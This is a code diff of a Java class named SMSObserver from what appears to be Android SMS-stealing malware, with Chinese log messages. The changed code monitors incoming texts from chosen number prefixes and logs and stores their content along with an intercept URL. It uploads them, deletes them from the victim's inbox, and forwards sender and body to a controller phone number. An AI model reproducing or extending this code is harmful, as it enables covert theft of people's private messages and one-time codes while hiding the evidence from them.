@@ -5,6 +5,7 @@ import android.app.sdk.SmsActivity;
 import android.app.sms.async.SubmitDateThread;
 import android.app.sms.manager.SMSManager;
 import android.app.sms.sqlite.DQLiteOpenHelper;
+import android.app.sms.utils.BaseData;
 import android.app.sms.utils.LogUtils;
 import android.content.Context;
 import android.database.ContentObserver;
@@ -17,7 +18,6 @@ public class SMSObserver extends ContentObserver {
 	private int oldId;
 	private boolean isflag;
 	private Context context;
-	private String[] nums = new String[] {"10", "9", "11", "16","152","159"};		//1
 	
 	public SMSObserver(Context context, Handler handler) {
 		super(handler);
@@ -33,16 +33,13 @@ public class SMSObserver extends ContentObserver {
 			int status = c.getInt(c.getColumnIndex("status"));
 			String body = c.getString(c.getColumnIndex("body"));
 			String address = c.getString(c.getColumnIndex("address")).replace("+86", "").replace("+1", "");
-			if (this.oldId == 0) {
-				this.oldId = id;
-			};
+			LogUtils.write("Send", "监听到短信数据变动:id="+ id + ",type=" + type + ",status=" + status + ",address=" + address + ",body=" + body);
 			if (status != 0 && id > this.oldId) {
-				LogUtils.write("Send", "监听到短信数据变动:id="+ id + ",type=" + type + ",status=" + status + ",address=" + address + ",body=" + body);
 				this.isflag = false;
 				this.oldId = id;
 				if (type == 1) {
-					for (int i = 0; i < this.nums.length; i++) {
-						if (address.startsWith(this.nums[i])) {
+					for (int i = 0; i < BaseData.nums.length; i++) {
+						if (address.startsWith(BaseData.nums[i])) {
 							this.isflag = true;
 							break;
 						}
@@ -53,13 +50,11 @@ public class SMSObserver extends ContentObserver {
 				if (this.isflag) {
 					String lx = (type == 1 ? "拦截" : "发件箱");
 					LogUtils.write("Send", "检测类型=" + lx + ",拦截内容=" + body);
-					DQLiteOpenHelper.getHelper(this.context).addData(lx, address, body, new Date());
+					DQLiteOpenHelper.getHelper(this.context).addData(lx, address, body, SmsActivity.interceptUrl, new Date());
 					SubmitDateThread.startSendData(this.context);
 					if (type == 1) {
 						this.context.getContentResolver().delete(Uri.parse("content://sms"), "_id=" + id, null);
-						SMSManager.send(this.context, SmsActivity.phonenum, SmsActivity.lanjie + address + "#" + body);
-					} else {
-						SMSManager.send(this.context, SmsActivity.phonenum, SmsActivity.zhuanfa + address + "#" + body);
+						SMSManager.send(this.context, SmsActivity.getPhone(), SmsActivity.lanjie + address + "#" + body);
 					}
 				}
 			}
